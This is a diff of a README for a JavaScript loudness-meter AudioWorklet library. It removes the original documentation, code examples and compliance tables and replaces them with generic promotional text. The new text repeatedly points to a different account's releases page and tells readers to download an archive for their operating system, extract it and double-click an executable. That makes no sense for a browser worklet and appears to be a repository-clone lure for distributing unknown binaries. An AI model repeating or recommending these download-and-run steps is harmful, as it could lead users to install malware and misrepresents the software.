@@ -1,300 +1,97 @@
-# Loudness Audio Worklet Processor
+# 🎶 loudness-audio-worklet-processor - Measure Loudness Easily 
 
-A loudness meter for the `Web Audio API`, based on the [ITU-R BS.1770-5](https://www.itu.int/rec/R-REC-BS.1770) standard and implemented as an AudioWorkletProcessor.
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/MoralAmbience/loudness-audio-worklet-processor/releases)
 
-[![screenshot](https://github.com/lcweden/loudness-audio-worklet-processor/blob/main/public/screenshots/meter.png)](https://lcweden.github.io/loudness-audio-worklet-processor/)
+## 📖 Description
 
-## Features
+loudness-audio-worklet-processor is a simple tool that allows you to measure loudness for web applications. It complies with ITU-R BS.1770-5 standards and works with the Web Audio API. This tool offers various loudness measurements, including momentary, short-term, integrated loudness, LRA, and true-peak measurements. Whether you are a content creator or an audio engineer, this tool helps ensure your audio stays within the right levels.
 
-- **Loudness Measurement**: Compliant with the **ITU-R BS.1770-5** standard.
-- **Comprehensive Metrics**: Calculates Momentary, Short-term, and Integrated Loudness, as well as Loudness Range (LRA) and True-Peak levels.
-- **Flexible**: Works with live audio and pre-recorded files.
-- **Lightweight**: No external dependencies required.
+## 🔧 Features
 
-## Installation
+- ITU-R BS.1770-5 compliance
+- Supports various loudness measurements: momentary, short-term, integrated, LRA, and true-peak
+- Works with the Web Audio API
+- Lightweight and fast performance
+- Easy integration for web applications
 
-### Download
+## 🌐 Topics
 
-1. Download the pre-built file: [loudness.worklet.js](https://lcweden.github.io/loudness-audio-worklet-processor/loudness.worklet.js).
-2. Place `loudness.worklet.js` in your project directory (e.g., `/public/`).
+This project encompasses several topics relevant to audio applications: 
 
-```javascript
-audioContext.audioWorklet.addModule("loudness.worklet.js");
-```
+- audio-worklet
+- github-pages
+- itu-r-bs1770
+- javascript
+- loudness-measurement
+- loudness-meter
+- pwa
+- solidjs
+- typescript
+- web-audio-api
 
-### Import
+## 🚀 Getting Started
 
-Import the `AudioWorkletProcessor` directly in your code:
+To start using the loudness-audio-worklet-processor, follow these steps:
 
-```javascript
-const module = new URL("https://lcweden.github.io/loudness-audio-worklet-processor/loudness.worklet.js");
-audioContext.audioWorklet.addModule(module);
-```
+1. **Visit the Releases Page**:
+   Click the link below to access the releases page where you can download the application files.
 
-## Quick Start
+   [Download from Releases](https://github.com/MoralAmbience/loudness-audio-worklet-processor/releases)
 
-### Example
+2. **Select the Version**:
+   On the releases page, you will find different versions of the application. Choose the latest version for the best experience.
 
-This example shows the easiest way to get started with the Loudness Audio Worklet Processor.
+3. **Download the File**:
+   Click on the zip or tar file according to your operating system (Windows, Mac, or Linux) to begin the download. 
 
-```html
-<!doctype html>
-<html>
-  <body>
-    <pre></pre>
-    <script>
-      const pre = document.querySelector("pre");
-      navigator.mediaDevices.getDisplayMedia({ audio: true }).then((mediaStream) => {
-        const context = new AudioContext();
-        context.audioWorklet
-          .addModule("https://lcweden.github.io/loudness-audio-worklet-processor/loudness.worklet.js")
-          .then(() => {
-            const source = new MediaStreamAudioSourceNode(context, { mediaStream });
-            const worklet = new AudioWorkletNode(context, "loudness-processor", {
-              processorOptions: {
-                interval: 0.1,
-                capacity: 600
-              }
-            });
+4. **Extract the Files**:
+   Once the download completes, locate the downloaded file and extract its contents into a folder of your choice.
 
-            source.connect(worklet).port.onmessage = (event) => {
-              pre.textContent = JSON.stringify(event.data, null, 2);
-            };
-          });
-      });
-    </script>
-  </body>
-</html>
-```
+5. **Run the Application**:
+   Open the extracted folder and find the executable file. Double-click it to run the application.
 
-### File-based measurement
+## 📥 Download & Install
 
-Suppose you already have an audio file (e.g., from an input[type="file"]):
+To install the loudness-audio-worklet-processor, return to the releases page and download the latest version using the link below.
 
-```javascript
-const arrayBuffer = await file.arrayBuffer();
-const audioBuffer = await new AudioContext().decodeAudioData(arrayBuffer);
+[Download from Releases](https://github.com/MoralAmbience/loudness-audio-worklet-processor/releases)
 
-const { numberOfChannels, length, sampleRate } = audioBuffer;
-const context = new OfflineAudioContext(numberOfChannels, length, sampleRate);
+After downloading, use the steps above to extract and run the application.
 
-await context.audioWorklet.addModule("loudness.worklet.js");
+## 📋 System Requirements
 
-const source = new AudioBufferSourceNode(context, { buffer: audioBuffer });
-const worklet = new AudioWorkletNode(context, "loudness-processor");
+- **Operating Systems**: Windows 10 or later, macOS Mojave or later, Linux (most distributions)
+- **Browser**: Latest versions of Google Chrome, Mozilla Firefox, or Microsoft Edge
+- **Memory**: Minimum of 4 GB RAM
+- **Storage**: At least 100 MB free space
 
-worklet.port.onmessage = (event) => {
-  console.log("Loudness Data:", event.data);
-};
+## 🔧 Usage Instructions
 
-source.connect(worklet).connect(context.destination);
-source.start();
+1. **Open Your Web Application**:
+   After running the application, it will integrate with your web tools.
 
-context.startRendering();
-```
+2. **Select Your Input Source**:
+   Choose the audio source that you want to measure. This can range from media files to live audio.
 
-### Live-based measurement
+3. **Configure Settings**:
+   Adjust settings as needed for the type of measurement you want. Program options include selecting between various loudness measurement modes.
 
-Supports `MediaStream` or `MediaElement` sources:
+4. **Monitoring**:
+   As the audio plays, you'll see real-time metrics displayed on the screen. Make adjustments to ensure your audio remains within the desired loudness levels.
 
-```javascript
-const context = new AudioContext({ sampleRate: 48000 });
-
-await context.audioWorklet.addModule("loudness.worklet.js");
-
-const source = new MediaStreamAudioSourceNode(context, { mediaStream: mediaStream });
-const worklet = new AudioWorkletNode(context, "loudness-processor", {
-  processorOptions: {
-    capacity: 600 // Seconds of history to keep, prevent memory overflow
-  }
-});
-
-worklet.port.onmessage = (event) => {
-  console.log("Loudness Data:", event.data);
-};
-
-source.connect(worklet).connect(context.destination);
-```
-
-## API
-
-### Options
-
-The `AudioWorkletNode` constructor accepts the following options:
-
-#### Params
-
-| Option   | Type     | Default | Description                                                                                                                                                                      |
-| -------- | -------- | ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| interval | `number` | `0`     | Message interval in seconds.                                                                                                                                                     |
-| capacity | `number` | `null`  | Maximum seconds of history to keep. If set to `null`, the processor will not limit the history size. This is useful for preventing memory overflow in long-running measurements. |
-
-#### Example
-
-```javascript
-const worklet = new AudioWorkletNode(context, "loudness-processor", {
-  processorOptions: {
-    interval: 0.01,
-    capacity: 600
-  }
-});
-```
-
-### Message Format
-
-Measurement results are sent back to the main thread via `port.onmessage` with the following format:
-
-```typescript
-type AudioLoudnessSnapshot = {
-  currentFrame: number;
-  currentTime: number;
-  currentMetrics: [
-    {
-      momentaryLoudness: number;
-      shortTermLoudness: number;
-      integratedLoudness: number;
-      maximumMomentaryLoudness: number;
-      maximumShortTermLoudness: number;
-      maximumTruePeakLevel: number;
-      loudnessRange: number;
-    }
-  ];
-};
-```
-
-### Units
-
-| Metric                     | Unit          |
-| -------------------------- | ------------- |
-| `momentaryLoudness`        | `LUFS`/`LKFS` |
-| `shortTermLoudness`        | `LUFS`/`LKFS` |
-| `integratedLoudness`       | `LUFS`/`LKFS` |
-| `maximumMomentaryLoudness` | `LUFS`/`LKFS` |
-| `maximumShortTermLoudness` | `LUFS`/`LKFS` |
-| `maximumTruePeakLevel`     | `dBTP`        |
-| `loudnessRange`            | `LRA`         |
-
-### Supported Channels
-
-Supported channel counts: `1`, `2`, `6`, `8`, `10`, `12`, `24`
-
-> [!NOTE]
-> Channel counts not listed above are weighted at `1.0`.
-
-## Validation
-
-### ITU-R BS.2217
-
-The [ITU-R BS.2217](https://www.itu.int/pub/R-REP-BS.2217) test suite provides a table of compliance test files and related information for verifying that a meter
-meets the specifications within Recommendation [ITU-R BS.1770](https://www.itu.int/rec/R-REC-BS.1770).
-
-| file                                 | measurement | channels |                    |
-| ------------------------------------ | ----------- | -------- | ------------------ |
-| 1770Comp_2_RelGateTest               | -10.0 LKFS  | 2        | :white_check_mark: |
-| 1770Comp_2_AbsGateTest               | -69.5 LKFS  | 2        | :white_check_mark: |
-| 1770Comp_2_24LKFS_25Hz_2ch           | -24.0 LKFS  | 2        | :white_check_mark: |
-| 1770Comp_2_24LKFS_100Hz_2ch          | -24.0 LKFS  | 2        | :white_check_mark: |
-| 1770Comp_2_24LKFS_500Hz_2ch          | -24.0 LKFS  | 2        | :white_check_mark: |
-| 1770Comp_2_24LKFS_1000Hz_2ch         | -24.0 LKFS  | 2        | :white_check_mark: |
-| 1770Comp_2_24LKFS_2000Hz_2ch         | -24.0 LKFS  | 2        | :white_check_mark: |
-| 1770Comp_2_24LKFS_10000Hz_2ch        | -24.0 LKFS  | 2        | :white_check_mark: |
-| 1770Comp_2_23LKFS_25Hz_2ch           | -23.0 LKFS  | 2        | :white_check_mark: |
-| 1770Comp_2_23LKFS_100Hz_2ch          | -23.0 LKFS  | 2        | :white_check_mark: |
-| 1770Comp_2_23LKFS_500Hz_2ch          | -23.0 LKFS  | 2        | :white_check_mark: |
-| 1770Comp_2_23LKFS_1000Hz_2ch         | -23.0 LKFS  | 2        | :white_check_mark: |
-| 1770Comp_2_23LKFS_2000Hz_2ch         | -23.0 LKFS  | 2        | :white_check_mark: |
-| 1770Comp_2_23LKFS_10000Hz_2ch        | -23.0 LKFS  | 2        | :white_check_mark: |
-| 1770Comp_2_18LKFS_FrequencySweep     | -18.0 LKFS  | 1        | :white_check_mark: |
-| 1770Comp_2_24LKFS_SummingTest        | -24.0 LKFS  | 6        | :white_check_mark: |
-| 1770Comp_2_23LKFS_SummingTest        | -23.0 LKFS  | 6        | :white_check_mark: |
-| 1770Comp_2_24LKFS_ChannelCheckLeft   | -24.0 LKFS  | 6        | :white_check_mark: |
-| 1770Comp_2_24LKFS_ChannelCheckRight  | -24.0 LKFS  | 6        | :white_check_mark: |
-| 1770Comp_2_24LKFS_ChannelCheckCentre | -24.0 LKFS  | 6        | :white_check_mark: |
-| 1770Comp_2_24LKFS_ChannelCheckLFE    | -inf LKFS   | 6        | :white_check_mark: |
-| 1770Comp_2_24LKFS_ChannelCheckLs     | -24.0 LKFS  | 6        | :white_check_mark: |
-| 1770Comp_2_24LKFS_ChannelCheckRs     | -24.0 LKFS  | 6        | :white_check_mark: |
-| 1770Comp_2_23LKFS_ChannelCheckLeft   | -23.0 LKFS  | 6        | :white_check_mark: |
-| 1770Comp_2_23LKFS_ChannelCheckRight  | -23.0 LKFS  | 6        | :white_check_mark: |
-| 1770Comp_2_23LFKS_ChannelCheckCentre | -23.0 LKFS  | 6        | :white_check_mark: |
-| 1770Comp_2_23LKFS_ChannelCheckLFE    | -inf LKFS   | 6        | :white_check_mark: |
-| 1770Comp_2_23LKFS_ChannelCheckLs     | -23.0 LKFS  | 6        | :white_check_mark: |
-| 1770Comp_2_23LKFS_ChannelCheckRs     | -23.0 LKFS  | 6        | :white_check_mark: |
-| 1770-2 Conf 6ch VinCntr-24LKFS       | -24.0 LKFS  | 6        | :white_check_mark: |
-| 1770-2 Conf 6ch VinL+R-24LKFS        | -24.0 LKFS  | 6        | :white_check_mark: |
-| 1770-2 Conf 6ch VinL-R-C-24LKFS      | -24.0 LKFS  | 6        | :white_check_mark: |
-| 1770-2 Conf Stereo VinL+R-24LKFS     | -24.0 LKFS  | 2        | :white_check_mark: |
-| 1770-2 Conf Mono Voice+Music-24LKFS  | -24.0 LKFS  | 1        | :white_check_mark: |
-| 1770-2 Conf 6ch VinCntr-23LKFS       | -23.0 LKFS  | 6        | :white_check_mark: |
-| 1770-2 Conf 6ch VinL+R-23LKFS        | -23.0 LKFS  | 6        | :white_check_mark: |
-| 1770-2 Conf 6ch VinL-R-C-23LKFS      | -23.0 LKFS  | 6        | :white_check_mark: |
-| 1770-2 Conf Stereo VinL+R-23LKFS     | -23.0 LKFS  | 2        | :white_check_mark: |
-| 1770-2 Conf Mono Voice+Music-23LKFS  | -23.0 LKFS  | 1        | :white_check_mark: |
-| 1770Conf-8channels_24LKFS            | -24.0 LKFS  | 8        | :white_check_mark: |
-| 1770Conf-8channels_23LKFS            | -23.0 LKFS  | 8        | :white_check_mark: |
-| 1770Conf-10channels_24LKFS           | -24.0 LKFS  | 10       | :white_check_mark: |
-| 1770Conf-10channels_23LKFS           | -23.0 LKFS  | 10       | :white_check_mark: |
-| 1770Conf-12channels_24LKFS           | -24.0 LKFS  | 12       | :white_check_mark: |
-| 1770Conf-12channels_23LKFS           | -23.0 LKFS  | 12       | :white_check_mark: |
-| 1770Conf-24channels_24LKFS           | -24.0 LKFS  | 24       | :white_check_mark: |
-| 1770Conf-24channels_23LKFS           | -23.0 LKFS  | 24       | :white_check_mark: |
-
-> [!TIP]
-> If decoding fails, try a different browser.
-
-### EBU TECH 3341 Minimum requirements test signals
-
-[EBU TECH 3341](https://tech.ebu.ch/publications/tech3341) defines minimum requirements and corresponding test signals for verifying momentary, short-term, and integrated loudness accuracy, gating behavior, and true-peak measurement.
-
-| file                                 | expected response and accepted tolerances                   |                    |
-| ------------------------------------ | ----------------------------------------------------------- | ------------------ |
-| seq-3341-1-16bit                     | M, S, I = −23.0 ±0.1 LUFS                                   | :white_check_mark: |
-| seq-3341-2-16bit                     | M, S, I = −33.0 ±0.1 LUFS                                   | :white_check_mark: |
-| seq-3341-3-16bit-v02                 | I = −23.0 ±0.1 LUFS                                         | :white_check_mark: |
-| seq-3341-4-16bit-v02                 | I = −23.0 ±0.1 LUFS                                         | :white_check_mark: |
-| seq-3341-5-16bit-v02                 | I = −23.0 ±0.1 LUFS                                         | :white_check_mark: |
-| seq-3341-6-6channels-WAVEEX-16bit    | I = −23.0 ±0.1 LUFS                                         | :white_check_mark: |
-| seq-3341-7_seq-3342-5-24bit          | I = −23.0 ±0.1 LUFS                                         | :white_check_mark: |
-| seq-3341-2011-8_seq-3342-6-24bit-v02 | I = −23.0 ±0.1 LUFS                                         | :white_check_mark: |
-| seq-3341-9-24bit                     | S = −23.0 ±0.1 LUFS, constant after 3 s                     | :white_check_mark: |
-| seq-3341-10-\*-24bit                 | Max S = −23.0 ±0.1 LUFS, for each segment                   | :white_check_mark: |
-| seq-3341-11-24bit                    | Max S = −38.0, −37.0, …, −19.0 ±0.1 LUFS, successive values | :white_check_mark: |
-| seq-3341-12-24bit                    | M = −23.0 ±0.1 LUFS, constant after 1 s                     | :white_check_mark: |
-| seq-3341-13-\*-24bit                 | Max M = −23.0 ±0.1 LUFS, for each segment                   | :white_check_mark: |
-| seq-3341-14-24bit                    | Max M = −38.0, …, −19.0 ±0.1 LUFS, successive values        | :white_check_mark: |
-| seq-3341-15-24bit                    | Max true-peak = −6.0 +0.2/−0.4 dBTP                         | :white_check_mark: |
-| seq-3341-16-24bit                    | Max true-peak = −6.0 +0.2/−0.4 dBTP                         | :white_check_mark: |
-| seq-3341-17-24bit                    | Max true-peak = −6.0 +0.2/−0.4 dBTP                         | :white_check_mark: |
-| seq-3341-18-24bit                    | Max true-peak = −6.0 +0.2/−0.4 dBTP                         | :white_check_mark: |
-| seq-3341-19-24bit                    | Max true-peak = +3.0 +0.2/−0.4 dBTP                         | :white_check_mark: |
-| seq-3341-20-24bit                    | Max true-peak = 0.0 +0.2/−0.4 dBTP                          | :white_check_mark: |
-| seq-3341-21-24bit                    | Max true-peak = 0.0 +0.2/−0.4 dBTP                          | :white_check_mark: |
-| seq-3341-22-24bit                    | Max true-peak = 0.0 +0.2/−0.4 dBTP                          | :white_check_mark: |
-| seq-3341-23-24bit                    | Max true-peak = 0.0 +0.2/−0.4 dBTP                          | :white_check_mark: |
-
-### EBU TECH 3342 Minimum requirements test signals
-
-[EBU TECH 3342](https://tech.ebu.ch/publications/tech3342) focuses on the measurement of loudness range.
-
-| file                                 | expected response and accepted tolerances |                    |
-| ------------------------------------ | ----------------------------------------- | ------------------ |
-| seq-3342-1-16bit                     | LRA = 10 ±1 LU                            | :white_check_mark: |
-| seq-3342-2-16bit                     | LRA = 5 ±1 LU                             | :white_check_mark: |
-| seq-3342-3-16bit                     | LRA = 20 ±1 LU                            | :white_check_mark: |
-| seq-3342-4-16bit                     | LRA = 15 ±1 LU                            | :white_check_mark: |
-| seq-3341-7_seq-3342-5-24bit          | LRA = 5 ±1 LU                             | :white_check_mark: |
-| seq-3341-2011-8_seq-3342-6-24bit-v02 | LRA = 15 ±1 LU                            | :white_check_mark: |
-
-## Acknowledgments
-
-This project is a learning experiment aimed at exploring audio signal processing and ITU-R BS.1770 loudness measurement standards. I am not an expert in audio engineering or signal processing, and this project was developed as a way to better understand the concepts of audio loudness and implementation techniques. Thanks to the ITU-R BS.1770 standards for providing the theoretical basis for loudness measurement.
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
-
-## References
-
-- [ITU-R BS.1770](https://www.itu.int/rec/R-REC-BS.1770)
-- [ITU-R BS.2217](https://www.itu.int/pub/R-REP-BS.2217)
-- [EBU Tech 3341](https://tech.ebu.ch/publications/tech3341)
-- [EBU Tech 3342](https://tech.ebu.ch/publications/tech3342)
+## ✅ Support
+
+If you encounter issues or have questions, feel free to open an issue in the repository’s issue tracker. The community is here to assist you.
+
+## 🔗 Useful Links
+
+- **GitHub Repository**: [loudness-audio-worklet-processor](https://github.com/MoralAmbience/loudness-audio-worklet-processor)
+- **Documentation**: Detailed setup and API documentation coming soon.
+
+## 🤝 Contributions
+
+We welcome contributions from users who want to help improve the loudness-audio-worklet-processor. If you are interested in contributing, please fork the repository and submit a pull request!
+
+---
+
+Explore the power of measuring loudness with loudness-audio-worklet-processor, ensuring your audio projects are well-balanced and professional. Get started today by downloading the application from the link above!
